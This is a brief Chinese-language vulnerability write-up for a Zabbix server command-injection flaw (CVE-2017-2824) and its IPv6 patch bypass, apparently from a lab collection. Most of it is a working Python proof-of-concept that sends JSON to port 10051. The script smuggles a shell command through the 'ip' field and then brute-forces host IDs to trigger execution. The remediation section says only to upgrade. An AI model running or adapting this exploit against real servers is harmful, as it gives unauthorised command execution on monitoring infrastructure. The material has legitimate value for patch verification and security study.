### 一 漏洞描述
Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。在CVE-2017-2824中,其Server端 trapper command 功能存在一处代码执行漏洞,而修复补丁并不完善,导致可以利用IPv6进行绕过,注入任意命令。

### 二 漏洞利用
运行poc  
{"request": "active checks", "host": "vulhub", "ip": ";touch /tmp/success"}

```python
import sys
import socket
import json
import sys

def send(ip, data):    
    conn = socket.create_connection((ip, 10051), 10)    
    conn.send(json.dumps(data).encode())    
    data = conn.recv(2048)    
    conn.close()    
    return data

target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}))
for i in range(10000, 10500):    
    data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})    
    if data and b'failed' not in data:        
        print('hostid: %d' % i)        
        print(data)
```

### 三 漏洞修复
升级
